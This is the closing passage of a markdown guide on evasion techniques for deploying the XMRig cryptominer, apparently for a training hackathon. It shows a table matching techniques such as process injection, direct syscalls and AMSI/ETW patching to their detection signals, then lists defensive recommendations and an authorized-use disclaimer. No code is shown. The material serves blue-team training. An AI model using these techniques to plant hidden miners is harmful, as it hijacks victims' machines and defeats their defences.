1. **Polymorphic Loaders**: Behavioral analysis, entropy checks
2. **In-Memory Execution**: Memory scanning for unbacked executables
3. **LOLBAS Abuse**: Parent-child process relationship anomalies
4. **Process Injection**: Modified memory regions, thread injection events
5. **Direct Syscalls**: Syscall mismatches, missing ETW events
6. **Environmental Keying**: Delayed execution, decryption attempts

### Defensive Recommendations
- Enable WDAC (Windows Defender Application Control)
- Monitor for AMSI/ETW patching attempts
- Baseline normal LOLBAS usage
- Implement memory scanning
- Monitor syscall patterns
- Use EDR with kernel-mode detection

---

## Conclusion

These advanced techniques demonstrate APT-level sophistication in deploying XMRig. Each method has trade-offs between complexity, reliability, and stealth. For educational hackathon purposes, implementing even a subset of these techniques provides excellent blue team training material.

**Remember**: These are DEFENSIVE TRAINING TOOLS. Use only in authorized environments with explicit permission.

---

**Document Version**: 1.0
**Last Updated**: 2025-10-02
**Classification**: Educational - Authorized Testing Only
